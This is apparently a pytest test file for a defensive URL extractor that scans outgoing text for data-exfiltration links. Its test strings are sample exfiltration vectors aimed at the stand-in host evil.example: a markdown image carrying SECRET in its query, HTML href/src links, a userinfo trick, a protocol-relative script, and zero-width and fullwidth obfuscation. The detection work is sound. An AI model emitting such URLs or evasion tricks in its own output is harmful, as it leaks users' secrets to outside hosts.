"""URL extraction from outgoing text: every way a URL can carry data out (A5, A7)."""

from itertools import pairwise

import pytest
from hypothesis import given
from hypothesis import strategies as st

from notary_core.urls import ExtractedUrl, extract_urls, normalize_text


def hosts(text: str) -> list[str]:
    return [u.host for u in extract_urls(text)]


@pytest.mark.attack("A5")
def test_plain_scheme_url_found() -> None:
    found = extract_urls("see https://evil.example/path")
    assert [(u.raw, u.host) for u in found] == [("https://evil.example/path", "evil.example")]


@pytest.mark.attack("A5")
def test_markdown_image_with_secret_in_query() -> None:
    assert hosts("![x](https://evil.example/?d=SECRET)") == ["evil.example"]


@pytest.mark.attack("A5")
def test_markdown_link() -> None:
    found = extract_urls("[click](evil.example/y)")
    assert [(u.raw, u.host) for u in found] == [("evil.example/y", "evil.example")]


@pytest.mark.attack("A5")
def test_html_href_and_src() -> None:
    text = """<a href="https://evil.example">x</a> <img src='http://img.example/x.png'>"""
    assert hosts(text) == ["evil.example", "img.example"]


@pytest.mark.attack("A5")
def test_userinfo_trick_reports_real_host() -> None:
    assert hosts("https://trusted.com@evil.example/") == ["evil.example"]


@pytest.mark.attack("A5")
def test_protocol_relative_url_found() -> None:
    assert hosts("load //cdn.evil.example/x.js now") == ["cdn.evil.example"]


@pytest.mark.attack("A7")
def test_zero_width_chars_cannot_hide_a_url() -> None:
    assert hosts("ht​tps://evil.example/x") == ["evil.example"]
    assert hosts("https://evil⁠.example") == ["evil.example"]


@pytest.mark.attack("A7")
def test_fullwidth_characters_are_normalized() -> None:
    assert hosts("\uff48\uff54\uff54\uff50\uff53\uff1a\uff0f\uff0fevil.example") == ["evil.example"]


@pytest.mark.attack("A5")
def test_bare_domain_found() -> None:
    assert hosts("mail me at evil.example/x") == ["evil.example"]


@pytest.mark.attack("A5")
def test_email_address_is_not_a_url() -> None:
    assert extract_urls("write to user@acme.example please") == ()


@pytest.mark.attack("A5")
def test_file_names_are_not_urls() -> None:
    assert extract_urls("attached report.pdf and notes.txt") == ()


@pytest.mark.attack("A5")
def test_trailing_punctuation_trimmed() -> None:
    assert [u.raw for u in extract_urls("(see https://a.example/x).")] == ["https://a.example/x"]
    assert [u.raw for u in extract_urls("go to https://a.example/x, then")] == [
        "https://a.example/x"
    ]


def test_balanced_parentheses_are_kept() -> None:
    url = "https://en.example/wiki/Foo_(bar)"
    assert [u.raw for u in extract_urls(f"see {url}")] == [url]


@pytest.mark.attack("A5")
def test_results_sorted_and_deduplicated() -> None:
    found = extract_urls("a.example b.example [x](https://c.example/y) https://c.example/y")
    starts = [u.start for u in found]
    assert starts == sorted(starts)
    assert all(a.end <= b.start for a, b in pairwise(found))
    assert [u.host for u in found] == ["a.example", "b.example", "c.example", "c.example"]


def test_offsets_point_into_the_normalized_text() -> None:
    text = "ht​tps://evil.example/x tail"
    normalized = normalize_text(text)
    (url,) = extract_urls(text)
    assert normalized[url.start : url.end] == url.raw == "https://evil.example/x"


def test_normalize_text_keeps_whitespace_and_drops_format_characters() -> None:
    assert normalize_text("a​ b\n\tc\U000e0041") == "a b\n\tc"


def test_no_urls_gives_empty_tuple() -> None:
    assert extract_urls("") == ()
    assert extract_urls("just words, no links 3.14") == ()


@pytest.mark.attack("A7")
@given(st.text())
def test_extract_urls_never_raises(text: str) -> None:
    result = extract_urls(text)
    assert isinstance(result, tuple)
    assert all(isinstance(u, ExtractedUrl) and u.start < u.end for u in result)
